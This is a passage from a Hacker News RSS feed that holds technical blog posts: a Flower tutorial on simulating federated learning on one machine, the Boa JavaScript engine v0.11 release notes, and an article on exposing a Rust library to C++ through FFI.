– <a href="https://twitter.com/daniel_janes">Daniel J. Beutel</a></p></blockquote><p>At the end of this series we aim to show that, although Federated Learning is challenging to implement, Flower can make it easy to start with an idea, simulate it, and then gradually evolve it to bring it into production.</p><h2>Series</h2><ul><li><strong>Part 1: Single-Machine Simulation of Federated Learning Systems</strong></li><li>Part 2: Multi-Machine Simulation of Federated Learning Systems (coming soon)</li><li>Part 3: Evolving Workloads From Simulation Towards Production (coming soon)</li></ul><h2>Single-Machine Simulation</h2><p>What do we mean when we say simulate the Federated Learning process? Let us start with a quote from Wikipedia.</p><blockquote><p>A simulation is an approximate imitation of the operation of a process or system that represents its operation over time. Simulation is used in many contexts, such as simulation of technology for performance tuning or optimizing.
– <a href="https://en.wikipedia.org/wiki/Simulation">Wikipedia</a></p></blockquote><p>When we talk about a simulation with Flower we mean running an entire Federated Learning system (one server and multiple clients) on a single machine. Real-world Federated Learning systems (e.g., on mobile devices) have characteristics that are not present in simulation (e.g., connectivity issues), but well-crafted simulations are often a good starting point when developing a new system.</p><h2>Overview</h2><p>Our simulation will run one Federated Learning server and ten clients. We will write the code in such a way that we can increase the number of clients at a later point. All the code is available in the Flower repository in the <a href="https://github.com/adap/flower/tree/main/examples/simulation">examples directory</a>.</p><p>Our simulation will start the server as well as all clients using sub-processes of our main process. The main process will block until each of these processes exits. For the purpose of the simulation we are also going to create our own partitioned dataset.</p><h2>Dataset</h2><p>Federated Learning solves the problem of learning a model over multiple datasets. For research purposes, we often use an existing dataset and artificially split it into multiple partitions. This simulation uses CIFAR-10 and partitions it into as many partitions as there are clients in our simulation. All the code related to this is in its own Python module named <code>dataset.py</code>.</p><p>To get started we import <code>tensorflow</code>, <code>numpy</code>, and <code>flwr</code> and define some types that are going to be used in the signatures of our functions.</p><div><article><p>Copy</p><pre><code><span>from</span><span> typing </span><span>import</span><span> List, Tuple, cast
</span>
<span></span><span>import</span><span> tensorflow </span><span>as</span><span> tf
</span><span></span><span>import</span><span> numpy </span><span>as</span><span> np
</span>
<!-- -->XY = Tuple[np.ndarray, np.ndarray]
<!-- -->XYList = List[XY]
<!-- -->PartitionedDataset = List[Tuple[XY, XY]]
</code></pre></article></div><p><code>PartitionedDataset</code> will be our usual dataset which we normally would unpack as follows.</p><div><article><p>Copy</p><pre><code><span>local_dataset = partitioned_dataset[</span><span>0</span><span>]
</span>(x_train, y_train), (x_test, y_test) = local_dataset
</code></pre></article></div><p>Let's define a few helper methods now. The comments will explain what they do.</p><div><article><p>Copy</p><pre><code><span>def</span><span> </span><span>shuffle</span><span>(</span><span>x: np.ndarray, y: np.ndarray</span><span>) -&gt; XY:</span><span>
</span><span>    </span><span>"""Shuffle x and y."""</span><span>
</span><span>    idx = np.random.permutation(</span><span>len</span><span>(x))
</span><span>    </span><span>return</span><span> x[idx], y[idx]
</span>
<!-- -->
<span></span><span>def</span><span> </span><span>partition</span><span>(</span><span>x: np.ndarray, y: np.ndarray, num_partitions: </span><span>int</span><span>) -&gt; XYList:</span><span>
</span><span>    </span><span>"""Split x and y into a number of partitions."""</span><span>
</span><span>    </span><span>return</span><span> </span><span>list</span><span>(</span><span>zip</span><span>(np.split(x, num_partitions), np.split(y, num_partitions)))
</span>
<!-- -->
<span></span><span>def</span><span> </span><span>create_partitions</span><span>(</span><span>
</span><span>    source_dataset : XY,
</span><span>    num_partitions: </span><span>int</span><span>,
</span><span></span><span>) -&gt; XYList:</span><span>
</span><span>    </span><span>"""Create partitioned version of a source dataset."""</span><span>
</span>    x, y = source_dataset 
<!-- -->    x, y = shuffle(x, y)
<!-- -->    xy_partitions = partition(x, y, num_partitions)
<!-- -->
<span>    </span><span>return</span><span> xy_partitions</span></code></pre></article></div><p>Now we just need to bring everything together in a final function which will return the list of smaller datasets derived from CIFAR-10.</p><div><article><p>Copy</p><pre><code><span>def</span><span> </span><span>load</span><span>(</span><span>
</span><span>    num_partitions: </span><span>int</span><span>,
</span><span></span><span>) -&gt; PartitionedDataset:</span><span>
</span><span>    </span><span>"""Create partitioned version of CIFAR-10."""</span><span>
</span>    xy_train, xy_test = tf.keras.datasets.cifar10.load_data()
<!-- -->
<!-- -->    xy_train_partitions = create_partitions(xy_train, num_partitions)
<!-- -->    xy_test_partitions = create_partitions(xy_test, num_partitions)
<!-- -->
<span>    </span><span>return</span><span> </span><span>list</span><span>(</span><span>zip</span><span>(xy_train_partitions, xy_test_partitions))</span></code></pre></article></div><p>You can find the full version <a href="https://github.com/adap/flower/blob/main/examples/simulation/dataset.py">here</a></p><p>We now have a simple function which will return a partitioned version of CIFAR-10. Each partition will only be passed to a single client which will perform its training exclusively on that partition.</p><h2>Simulation</h2><p>We are now going to create a fairly simple simulation based on our partitioned dataset. We again start by importing the necessary libraries:</p><div><article><p>Copy</p><pre><code><span>from</span><span> multiprocessing </span><span>import</span><span> Process
</span><span></span><span>import</span><span> os
</span><span></span><span>from</span><span> typing </span><span>import</span><span> Tuple
</span>
<span></span><span># Make TensorFlow log less verbose</span><span>
</span><span>os.environ[</span><span>"TF_CPP_MIN_LOG_LEVEL"</span><span>] = </span><span>"3"</span><span>
</span>
<span></span><span>import</span><span> time
</span><span></span><span>import</span><span> tensorflow </span><span>as</span><span> tf
</span><span></span><span>import</span><span> numpy </span><span>as</span><span> np
</span><span></span><span>import</span><span> flwr </span><span>as</span><span> fl
</span><span></span><span>from</span><span> flwr.server.strategy </span><span>import</span><span> FedAvg
</span>
<span></span><span>import</span><span> dataset
</span>
<span></span><span># Used for type signatures</span><span>
</span>DATASET = Tuple[Tuple[np.ndarray, np.ndarray], Tuple[np.ndarray, np.ndarray]]
</code></pre></article></div><p>In the next step we are going to define a function which allows us to start a Flower server with a customized <code>FedAvg</code> strategy. We customize two strategy parameters: the number of clients we expect to be connected before the training starts and the fraction of connected clients that are sampled during each round.</p><p>An Example: We want to sample 50 out of 100 clients. To do this we have to wait until 100 clients are connected, which we do by setting <code>min_available_clients</code> to <code>100</code>. The additional <code>fraction_fit=0.5</code> results in 50% of the clients being sampled for training.</p><p>Let's look at the actual code to start the server:</p><div><article><p>Copy</p><pre><code><span>def</span><span> </span><span>start_server</span><span>(</span><span>num_rounds: </span><span>int</span><span>, num_clients: </span><span>int</span><span>, fraction_fit: </span><span>float</span><span>):</span><span>
</span><span>    </span><span>"""Start the server with a slightly adjusted FedAvg strategy."""</span><span>
</span>    strategy = FedAvg(min_available_clients=num_clients, fraction_fit=fraction_fit)
<span>    </span><span># Exposes the server by default on port 8080</span><span>
</span><span>    fl.server.start_server(strategy=strategy, config={</span><span>"num_rounds"</span><span>: num_rounds})</span></code></pre></article></div><p>For more details into the <code>start_server</code> function checkout the <a href="https://flower.dev/docs/apiref-flwr.html#server-start-server">API Reference</a>.</p><p>Now it's time to define our client code. We are going to use a Keras model which will make the client code fairly simple.</p><div><article><p>Copy</p><pre><code><span>def</span><span> </span><span>start_client</span><span>(</span><span>dataset: DATASET</span><span>) -&gt; </span><span>None</span><span>:</span><span>
</span><span>    </span><span>"""Start a single client with the provided dataset."""</span><span>
</span>
<span>    </span><span># Load and compile a Keras model for CIFAR-10</span><span>
</span><span>    model = tf.keras.applications.MobileNetV2((</span><span>32</span><span>, </span><span>32</span><span>, </span><span>3</span><span>), classes=</span><span>10</span><span>, weights=</span><span>None</span><span>)
</span><span>    model.</span><span>compile</span><span>(</span><span>"adam"</span><span>, </span><span>"sparse_categorical_crossentropy"</span><span>, metrics=[</span><span>"accuracy"</span><span>])
</span>
<span>    </span><span># Unpack the CIFAR-10 dataset partition</span><span>
</span>    (x_train, y_train), (x_test, y_test) = dataset
<!-- -->
<span>    </span><span># Define a Flower client</span><span>
</span><span>    </span><span>class</span><span> </span><span>CifarClient</span><span>(</span><span>fl.client.NumPyClient</span><span>):</span><span>
</span><span>        </span><span>def</span><span> </span><span>get_parameters</span><span>(</span><span>self</span><span>):</span><span>
</span><span>            </span><span>"""Return current weights."""</span><span>
</span><span>            </span><span>return</span><span> model.get_weights()
</span>
<span>        </span><span>def</span><span> </span><span>fit</span><span>(</span><span>self, parameters, config</span><span>):</span><span>
</span><span>            </span><span>"""Fit model and return new weights as well as number of training examples."""</span><span>
</span>            model.set_weights(parameters)
<span>            </span><span># Remove steps_per_epoch if you want to train over the full dataset</span><span>
</span><span>            </span><span># https://keras.io/api/models/model_training_apis/#fit-method</span><span>
</span><span>            model.fit(x_train, y_train, epochs=</span><span>1</span><span>, batch_size=</span><span>32</span><span>, steps_per_epoch=</span><span>3</span><span>)
</span><span>            </span><span>return</span><span> model.get_weights(), </span><span>len</span><span>(x_train)
</span>
<span>        </span><span>def</span><span> </span><span>evaluate</span><span>(</span><span>self, parameters, config</span><span>):</span><span>
</span><span>            </span><span>"""Evaluate using provided parameters."""</span><span>
</span>            model.set_weights(parameters)
<!-- -->            loss, accuracy = model.evaluate(x_test, y_test)
<span>            </span><span>return</span><span> </span><span>len</span><span>(x_test), loss, accuracy
</span>
<span>    </span><span># Start Flower client</span><span>
</span><span>    fl.client.start_numpy_client(</span><span>"0.0.0.0:8080"</span><span>, client=CifarClient())</span></code></pre></article></div><p>Finally we can bring everything together. We are going to load the dataset and provide each partition to a single client exclusively. The server and each client will have its own process which is started in our main process.</p><div><article><p>Copy</p><pre><code><span>def</span><span> </span><span>run_simulation</span><span>(</span><span>num_rounds: </span><span>int</span><span>, num_clients: </span><span>int</span><span>, fraction_fit: </span><span>float</span><span>):</span><span>
</span><span>    </span><span>"""Start a FL simulation."""</span><span>
</span>
<span>    </span><span># This will hold all the processes which we are going to create</span><span>
</span>    processes = []
<!-- -->
<span>    </span><span># Start the server</span><span>
</span>    server_process = Process(target=start_server, args=(num_rounds, num_clients, fraction_fit))
<!-- -->    server_process.start()
<!-- -->    processes.append(server_process)
<!-- -->
<span>    </span><span># Optionally block the script here for a second or two so the server has time to start</span><span>
</span><span>    time.sleep(</span><span>2</span><span>)
</span>
<span>    </span><span># Load the dataset partitions</span><span>
</span>    partitions = dataset.load(num_partitions=num_clients)
<!-- -->
<span>    </span><span># Start all the clients</span><span>
</span><span>    </span><span>for</span><span> partition </span><span>in</span><span> partitions:
</span>        client_process = Process(target=start_client, args=(partition,))
<!-- -->        client_process.start()
<!-- -->        processes.append(client_process)
<!-- -->
<span>    </span><span># Block until all processes are finished</span><span>
</span><span>    </span><span>for</span><span> p </span><span>in</span><span> processes:
</span>        p.join()
<!-- -->
<!-- -->
<span></span><span>if</span><span> __name__ == </span><span>"__main__"</span><span>:
</span><span>    run_simulation(num_rounds=</span><span>100</span><span>, num_clients=</span><span>10</span><span>, fraction_fit=</span><span>0.5</span><span>)</span></code></pre></article></div><h2>Setup with and without Docker</h2><p>In the <a href="https://github.com/adap/flower/tree/main/examples/simulation">example</a> code in our repository you will also find a Dockerfile as well as a <code>run.sh</code> shell script. If you have Docker installed you can simply run the shell script. It will build the Docker container and start the simulation. Alternatively checkout the <a href="https://github.com/adap/flower/tree/main/examples/simulation/README.md">README.md</a> which describes how to install the example project.</p><h2>Summary</h2><p>Although Federated Learning is hard, Flower can make it effortless to create a simulation which is already quite accurate and easily runs on a single machine. Feel free to experiment with different number of clients, rounds, fraction of clients which perform training on each round and many more hyperparameters. If questions should arise our growing community is always happy to support and can be found on our <a href="https://flower.dev/join-slack">Slack Community</a>.</p><p>If you like …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://flower.dev/blog/2021-01-14-single-machine-simulation-of-federated-learning-systems">https://flower.dev/blog/2021-01-14-single-machine-simulation-of-federated-learning-systems</a></em></p>]]>
            </description>
            <link>https://flower.dev/blog/2021-01-14-single-machine-simulation-of-federated-learning-systems</link>
            <guid isPermaLink="false">hacker-news-small-sites-25779486</guid>
            <pubDate>Thu, 14 Jan 2021 17:46:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Boa Release v0.11]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25779423">thread link</a>) | @jayflux
<br/>
January 14, 2021 | https://boa-dev.github.io/2021/01/14/boa-release-11.html | <a href="https://web.archive.org/web/*/https://boa-dev.github.io/2021/01/14/boa-release-11.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>

  

  <article>
    <p>Boa has reached a new release. v0.11, our biggest one yet!</p>

<p>Since v0.10 we’ve closed 77 issues and merged 129 pull requests. The engine has been faster and more compliant to the spec. Below are some of the highlights but please see the <a href="https://github.com/boa-dev/boa/blob/master/CHANGELOG.md#0110-2021-01-14">changelog</a> for more information.</p>

<p>What is Boa? See the <a href="https://boa-dev.github.io/about">About</a> page for more info.</p>

<h2 id="test-262">Test 262</h2>

<p>Test262 is the implementation conformance test suite maintained by TC39. It’s used by nearly all engines to measure how conformant they are to the specification. Boa pulls the tests in-tree and runs them against all PRs. You can find more about Test262 <a href="https://github.com/tc39/test262">here</a>.</p>

<p>Since v0.10 we have almost doubled on spec conformance, and reduced panics. A year ago Boa didn’t even track itself against Test262 so it was difficult to know how compliant we were to the spec, today not only do we track all changes against Test262 but we can see progress on a PR to PR basis.</p>

<p><img src="https://boa-dev.github.io/images/2021-01-14/conformance_light.png">
<img src="https://boa-dev.github.io/images/2021-01-14/conformance_dark.png"></p>

<p>Previously many tests failed to run as the test-runner was still being worked on. Those issues have been fixed and our tests jumped from 38k to 78K which is why the graph flips up above. Boa should never panic, however we’ve had many tests reveal areas where panics happen, this has helped us identify and apply correct fixes, to the point where our panics have gone from hundreds to under 50 (the graph above shows the dark red diminishing).</p>

<p>For live tracking of conformance tests you can check <a href="https://boa-dev.github.io/boa/test262/">here</a>. Below is a snapshot of the previous version and today.</p>

<div>
        <section id="version-latest"><div><div><h3>v0.10:</h3><ul><li>Total tests: <span>38,706</span></li><li>Passed tests: <span>6,960</span></li><li>Ignored tests: <span>5,748</span></li><li>Failed tests: <span>25,998</span></li><li>Conformance: <b>17.98%</b></li></ul></div></div></section>
        <section id="master-latest"><div><div><h3>v0.11:</h3><ul><li>Total tests: <span>78,497</span></li><li>Passed tests: <span>24,550</span></li><li>Ignored tests: <span>15,585</span></li><li>Failed tests: <span>38,362 (24 ⚠)</span></li><li>Conformance: <b>31.28%</b></li></ul></div></div></section>
        
</div>

<h2 id="regress">Regress</h2>

<p>In this release Boa switched from its own implementation (wrapping <code>regex</code>) to the <a href="https://github.com/ridiculousfish/regress"><code>regress</code></a> engine for regular expressions. Regress is a crate aiming to implement ECMAScript compliant regular expressions and Boa makes use of (and contributes back to) that.</p>

<p>While Regress is not 100% spec compliant this is something which is being worked on, also the switch gave us quite a performance boost in our <a href="https://boa-dev.github.io/boa/dev/bench/">benchmarks</a> we’re seeing almost 6X faster execution.</p>

<p><img src="https://boa-dev.github.io/images/2021-01-14/regex-bench-white.png">
<img src="https://boa-dev.github.io/images/2021-01-14/regex-bench-dark.png"></p>

<p>The above image shows a big drop in the middle of the graph, above <code>fb1b8d5</code> is where we switched over. Conformance went from 19.01% to 18.99% and introduced some panics, however many of those have since been fixed.</p>

<h2 id="iterating-over-bytes">Iterating over bytes</h2>

<p>Previously the lexer iterated over unicode chars (u32 code points), this wasn’t strictly neccesary for Boa and we have instead changed the lexer to work over bytes (u8). Iterating over bytes rather than chars is inherently much faster, non-ascii UTF8 bytes are all &gt;=128, and we might only really care about those being correct when parsing idents. This is standard practise amongs lexical analyzers and even browsers read source code byte-by-byte, using the rules of the language’s syntax to convert the source text into tokens.</p>

<p>This was worked on by @jevancc and his <a href="https://github.com/boa-dev/boa/pull/915/files">changes</a> have improved performance overall.</p>

<h2 id="embedding-examples">Embedding examples</h2>

<p>We are still working on what the public API should look like, some of these decisions are driven by feedback and the ever-changing way which Boa works.<br>
Not only you can run Boa against javascript today you can also embed your own objects and classes into the engine before it’s ran.</p>

<p>We’ve offered an <a href="https://github.com/boa-dev/boa/blob/master/boa/examples/classes.rs">example</a> to show how a class can be constructed in Rust then added to the environment before executing your scripts.
This should offer a great insight into how you can interop Rust with JavaScript by using Boa.</p>

<p>Below are some of the more recent functions available from the Context object for you to add your own functionality.</p>

<div><div><pre><code><span>// Rust implementation of a function injected into the environment</span>
<span>Context</span><span>::</span><span>register_global_function</span><span>(),</span>
<span>// Rust implementation of a class injected into the environment</span>
<span>Context</span><span>::</span><span>register_global_class</span><span>(),</span>
<span>// Rust implementation of a property injected into the environment</span>
<span>Context</span><span>::</span><span>register_global_property</span><span>()</span>
</code></pre></div></div>

<p>If there are any examples you would like added, please raise an issue on the main repository.</p>

<h2 id="generating-bytecode">Generating bytecode</h2>

<p>Today Boa walks the tree of the AST, although easy to implement it’s not ideal for performance.<br>
We are looking to do code generation which can then be interpreted. This gradual process may happen over many releases until at some point we can switch implementations under the hood. Our steps are:</p>

<ul>
  <li><del>Experiment with VM Path on isolated branch</del></li>
  <li><del>Experiment with generating more simpler instructions</del></li>
  <li>Build up parity with current implementation</li>
  <li>Run test suite over VM path including conformance tests</li>
  <li>Switch over once performance is steady</li>
  <li>Optimize code generation and intreperter</li>
</ul>

<h2 id="thank-you">Thank You</h2>

<p>Everything in this release has been such a huge effort, we want to thank all the <a href="https://github.com/boa-dev/boa/graphs/contributors?from=2020-10-02&amp;to=2021-01-12&amp;type=c">contributors</a> in this release, whether it was features, fixes or raising bugs.</p>

<p>If you’re interested in contributing to Boa, we have some <a href="https://github.com/boa-dev/boa/issues?q=is%3Aopen+is%3Aissue+label%3A%22good+first+issue%22">“good first issues”</a> and <a href="https://github.com/boa-dev/boa/issues?q=is%3Aopen+is%3Aissue+label%3A%22help+wanted%22">“issues where help is wanted”</a>.</p>

  </article>

</div>

      </div>
    </div></div>]]>
            </description>
            <link>https://boa-dev.github.io/2021/01/14/boa-release-11.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25779423</guid>
            <pubDate>Thu, 14 Jan 2021 17:42:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Expose a Rust Library to Other Languages (Esp. C++)]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25779349">thread link</a>) | @ogoffart
<br/>
January 14, 2021 | https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html | <a href="https://web.archive.org/web/*/https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        
    <section>
        <div>

    
    <h5>Posted on January 13, 2021 by Olivier Goffart and Simon Hausmann</h5>
    
  <p>
    With <a href="https://sixtyfps.io/">SixtyFPS</a>, we are creating a GUI toolkit. We chose
    Rust as the implementation language for our runtime library, and we want to make the same library usable from different
    programming languages. We believe programmers in all languages need to build GUIs - powered by the same runtime library.
    Rust, with its Foreign Function Interface (FFI) is an excellent choice.<br> In
    this article we look at how to expose an idiomatic C++ API from our Rust library.
  </p>

<h3 id="the-challenge">The Challenge</h3>

    <p>Initially we chose to start with support for three languages:</p>
    <ul>
        <li><b>Rust</b>: Because it's our implementation language.</li>
        <li><b>C++</b>: It's a low level language that we're familiar with, and is still one of the most established languages
            in the embedded device space.</li>
        <li><b>JavaScript / TypeScript</b>: Because it's a very popular dynamic language.</li>
    </ul>


    <p><img src="https://sixtyfps.io/blog/expose-rust-library-to-other-languages/diagrams.png"></p><p>The Rust library (also known as a crate) is split into two parts, the shared implementation crate and a thin idiomatic
        API crate.
    </p>
    <p>For JavaScript we use <a href="https://github.com/neon-bindings/neon">Neon</a> to expose an API. Neon enables us
        to conveniently write JavaScript APIs and create an NPM package.</p>
    <p>The C++ part is a bit more challenging.</p>

<h3 id="expose-idiomatic-cpp-api-through-ffi">Expose an Idiomatic C++ API through Rust FFI</h3>

    <p>We decided to keep the C++ API only in the header files. This is because, unlike with Rust, there's
        no widely adopted C++ equivalent of Cargo, to help with downloading and building dependencies. If we want to ship
        binaries, then we have to maintain ABI compatibility, which is difficult in C++.<br> This way, we can also keep the
        C++ binding as lightweight as possible: for performance and memory footprint.
    </p>
    
    <p>Rust cannot expose a C++ API: structures can only be exported using a C representation (<code>#[repr(C)]</code>) and
        <code>extern "C"</code> functions. This means that we cannot expose Rust features like traits, generics, or
        destructors even if they have a C++ equivalent.
     </p>
     
    <p>The Rust ecosystem provides a few helper crates to make the job easier:</p>
     <ul>
        <li><a href="https://github.com/eqrion/cbindgen"><b>cbindgen</b></a>: This helper crate automatically generates C/C++
            header files based on the <code>repr(C)</code> structure and the <code>extern "C"</code> functions. We use
            cbindgen to generate internal header files only. It's very helpful to avoid manually writing some unsafe error-prone
            boilerplate. 
        </li>
        <li><a href="https://github.com/mystor/rust-cpp">The <b>cpp</b> crate</a>: This
            helper crate is useful when calling C++ libraries from Rust, and we make use of that. However it is not suitable for
            exposing a C++ API from Rust. (Note: Olivier Goffart happens to be the maintainer.)
        </li>
                
        <li><a href="https://cxx.rs/">The <b>cxx</b> crate</a>: This would be a safer way than cbindgen to ensure that the
            interface between C++ and Rust is correct. While it could be useful, cbindgen already get us a long way. So
            we don't use it for now.
        </li>
    </ul>

<p>To build the correct shared library we use Cargo. The resulting library exports C mangled symbols. We ship
    a set of C++ header files that provide the C++ API and use the C functions behind the scenes. For convenience,
    we provide a CMake integration that ties together the library linkage and includes path setup. </p>

<h3 id="slices-vectors-strings">Slices, Vectors, and Strings</h3>

    <p>
    In FFI, passing a basic integer works out of the box. But what about more complex data types, like a 
    Rust slice or a string? Well, most classes like Rust's String, Vec, or slices are not <code>#[repr(C)]</code>,
    so we can't use them directly. While we could use these classes with an indirection, every simple call may need to go
    through a non-inline function boundary. So we would need to convert types, which means re-allocating memory.</p>
    <p>So instead of sharing code, we implemented data structures using <code>#[repr(C)]</code> and a stable ABI, so
        that they can be accessed directly from C++ and Rust, or any low-level language.</p>

   <p>For the slice we create a structure that holds a pointer and a size:</p>

<pre><code>#[repr(C)]
pub struct Slice&lt;'a, T&gt; {
    ptr: NonNull&lt;T&gt;,
    len: usize,
    phantom: PhantomData&lt;&amp;'a [T]&gt;,
}
</code></pre>

<p><code>Slice&lt;'a, T&gt;</code> can be dereferenced to <code>&amp;'a [T]</code>.
    In C++, cbindgen generates the following snippet:


</p><pre><code>template&lt;typename T&gt;
struct Slice {
    T *ptr;
    uintptr_t len;
};
</code></pre>

<p>We tell cbindgen to generate that code in a <code>cbindgen_private</code> namespace, and we wrap it an interface
similar to <code>std::span</code>.</p>

<p>We use strings and vectors to pass data between the engine and the user's code. This results in
    shared ownership where we want to avoid unnecessary copying of data. Our API is property based
    with setters and getters, therefore we implement shared ownership through
    <a href="https://en.wikipedia.org/wiki/Copy-on-write"></a>Implicit sharing / Copy-on-write. </p>

<p><img src="https://sixtyfps.io/blog/expose-rust-library-to-other-languages/sharedvector.png"></p><pre><code>#[repr(C)]
struct SharedVectorHeader {
    refcount: atomic::AtomicIsize,
    size: usize,
    capacity: usize,
}

#[repr(C)]
pub struct SharedVector&lt;T&gt; {
    inner: NonNull&lt;SharedVectorInner&lt;T&gt;&gt;,
}


/// These functions are called from the C++ constructor
/// and destructor
#[no_mangle]
pub unsafe extern "C" fn sixtyfps_shared_vector_allocate(
    size: usize, align: usize) -&gt; *mut u8 { /*...*/ }
#[no_mangle]
pub unsafe extern "C" fn sixtyfps_shared_vector_free(
    ptr: *mut u8, size: usize, align: usize) { /*...*/ }
}
</code></pre>

<p>In Rust, the <code>impl Clone</code> and <code>impl Drop</code> make sure to increment
and decrement the atomic reference count and call the destructors. Similarly, in C++, we implement
copy constructor and destructor for the same purpose. Note that we still need to call the Rust
allocator function via the exposed C interface.</p>

<p>Now we can write a wrapper in C++:
(<a href="https://github.com/sixtyfpsui/sixtyfps/blob/master/api/sixtyfps-cpp/include/sixtyfps_sharedvector.h">full file</a>)
</p>

<pre><code>template&lt;typename T&gt; struct SharedVector {
  SharedVector() : inner(nullptr) {}

  SharedVector(const SharedVector &amp;other)
    : inner(other.inner)
  { if (inner) ++inner-&gt;refcount; }

  ~SharedVector() {
     if (inner &amp;&amp; (--inner-&gt;refcount) == 0) {
        for (auto it = begin(); it &lt; end(); ++it)
            it-&gt;~T();
        cbindgen_private::sixtyfps_shared_vector_free(
            reinterpret_cast&lt;uint8_t *&gt;(inner),
            sizeof(SharedVectorHeader)
                + inner-&gt;capacity * sizeof(T),
            alignof(SharedVectorHeader));
     }
  }
  SharedVector &amp;operator=(const SharedVector &amp;other)
  { /*...*/ }

  const T *begin() const { /* ... */ }
  const T *end() const { /* ... */ }
  void push_back(const T &amp;value) { /* ... */ }
  // ... more vector-like API

private:
  // (SharedVectorHeader is generated by cbindgen)
  cbindgen_private::SharedVectorHeader *inner;
};
</code></pre>


    <p>Right now these types, such as <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedvector">SharedVector</a> and
        <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedstring">SharedString</a>, are within the internal <code>sixtyfps-corelib</code>
        crate, and re-exported for Rust users through the public <code>sixtyfps</code> crate.  If there is demand for it, we may consider moving them into a
        smaller public crate with its own release schedule.</p>


<h3 id="destructors">Destructors</h3>

    <p>It's important to note that <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedvector">SharedVector</a> and
        <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedstring">SharedString</a> have destructors in C++.
        We can't pass instances by value in <code>extern "C"</code> functions, because the calling conventions are different
        for arguments or return types with C++ destructors; not supported by C. Therefore we can only pass them by pointer
        or reference.
    </p>

    <p>If we want to add a C++ destructor, constructor, or any member functions to types directly exported by cbindgen to our public API, 
        we use 
        <code><a href="https://docs.rs/cbindgen/0.16.0/cbindgen/struct.ExportConfig.html">cbindgen::ExportConfig</a>::body</code>:</p>

<pre><code>cbindgen_config.export.body.insert(
    "MyStruct".to_owned(),
    "    inline MyStruct(); inline ~MyStruct();".to_owned()
  );
</code></pre>

    <p>
    Then we implement <code>MyStruct::MyStruct</code> and <code>MyStruct::~MyStruct</code> in a manually
    written header file, by either doing the memory management directly or calling C helper functions
    implemented in Rust.</p>
     <p>It's important to keep in mind that anything allocated from Rust needs to be freed by Rust. 
    The same applies to allocations in C++: they might not share the same allocator.
    </p>

<h3 id="dynamic-dispatch">Dynamic Dispatch (virtual table) Across the Language Barrier</h3>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e2/Bon_toutou.png/186px-Bon_toutou.png"></p><p>
    Let's start with the classic example of dynamic dispatch in Rust:</p>
<pre><code>pub trait Animal {
  fn speak(&amp;self, loudness: i32) -&gt; String;
}
struct Dog { name: String }
impl Animal for Dog {
  fn speak(&amp;self, loudness: i32) -&gt; String
  { "Waf!".into() }
}
#[no_mangle]
pub extern "C" fn do_something_with(
  animal: &amp;dyn Animal
) {
  println!("{}", animal.speak(1));
}
</code></pre>

<p>Unfortunately the above code does not work. How could we implement a class <code>Cat</code>
in C++ and call the <code>do_something_with</code> function? What if we wanted to implement
<code>do_something_with</code> in C++? The problem is that trait objects (<code>&amp;dyn</code>) are not
valid in FFI - their binary representation is not guaranteed to be stable. If we try to compile the above code,
we get this warning:</p>

<pre><code>warning: `extern` fn uses type `dyn Animal`, which is not FFI-safe
  | extern "C" fn do_something_with(animal: &amp;dyn Animal)
  |                                         ^^^^^^^^^^^ not FFI-safe
  = note: `#[warn(improper_ctypes_definitions)]` on by default
  = note: trait objects have no C equivalent</code></pre>

  <!--https://doc.rust-lang.org/reference/types/trait-object.html-->
<p>Internally, <a href="https://brson.github.io/rust-anthology/1/all-about-trait-objects.html">we know</a> that
a trait object is composed of a pointer to the instance, and a pointer to a virtual table containing
pointers to functions. The layout of this trait object (which pointer comes first) and the layout of the virtual
table is an implementation detail of Rust. So we decided to re-implement them to work accross FFI. Instead of
writing a <code>trait Animal</code>, we write a virtual table by hand:</p>

<pre><code>#[repr(C)]
pub struct AnimalVTable {
    speak: extern "C" fn speak(
        VRef&lt;AnimalVTable&gt;, i32, &amp; mut SharedString);
}
</code></pre>
<p>In this case, our virtual table has only one function. It is <code>#[repr(C)]</code> so that
cbindgen can generate a structure that the C++ code can access. Since we can't use <code>String</code>
we changed the return type to <code>SharedString</code>. We also pass the parameter by mutable reference instead
of just returning it, because it is not allowed to return a type that has a destructor.<br>
Instead of passing a trait object, our functions receive a pointer to the virtual table and
a …</p></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html">https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html</a></em></p>]]>
            </description>
            <link>https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25779349</guid>
            <pubDate>Thu, 14 Jan 2021 17:36:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CMake and the Future of C++ Package Management]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25779120">thread link</a>) | @ibobev
<br/>
January 14, 2021 | http://ibob.github.io/blog/2020/01/13/cmake-package-management/ | <a href="https://web.archive.org/web/*/http://ibob.github.io/blog/2020/01/13/cmake-package-management/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<nav>
<ul>
    <li><a href="http://ibob.github.io/blog/">Blog home</a></li>
    <li><a href="http://ibob.github.io/blog/tags/">Tags</a></li>
    <li>
    <a href="http://ibob.github.io/feed.xml" title="iboB blog feed" target="_blank">
        
        <span>RSS Feed</span>
    </a>
    </li>
</ul>
</nav>
<section>
  
  <p>Published on Jan 13, 2020.
    </p>
  <p><em>Well, at least according to me</em></p>

